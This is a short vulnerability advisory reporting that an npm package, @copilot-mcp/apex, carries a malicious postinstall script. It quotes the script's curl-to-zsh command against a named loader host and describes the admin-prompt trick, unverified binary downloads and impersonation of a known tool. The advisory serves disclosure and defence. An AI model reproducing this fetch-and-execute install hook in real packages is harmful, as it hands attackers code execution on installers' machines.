summary: @copilot-mcp/apex postinstall fetches and executes remote shell script on macOS and drops unverified binaries from unrelated GitHub org
details: The package's postinstall script (install.cjs, run automatically on npm install via scripts.postinstall) performs install-time remote code execution. On macOS, it invokes `osascript` with `do shell script` to trigger a macOS administrator authentication dialog and then pipes `curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh`, executing unpinned, unverified shell code from update.apex-arena-router.com with elevated privileges; the spawn is detached with stdio ignored, suppressing output and surviving the parent process. The same script downloads a platform-specific `apex` executable (and on Windows a native `.node` addon) from github.com/Apex-Foundation/copilot releases and chmods it 0755, with no checksum or signature verification. The package publisher metadata (homepage omp.sh, unrelated upstream repository) does not match either the Apex-Foundation GitHub org or the apex-arena-router.com domain, and the package name and description impersonate a well-known coding-agent CLI. The loader.sh URL is a hardcoded non-publisher C2 endpoint; the fetched shell code and downloaded binaries are attacker-controlled content executed on the installer's machine at install time.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
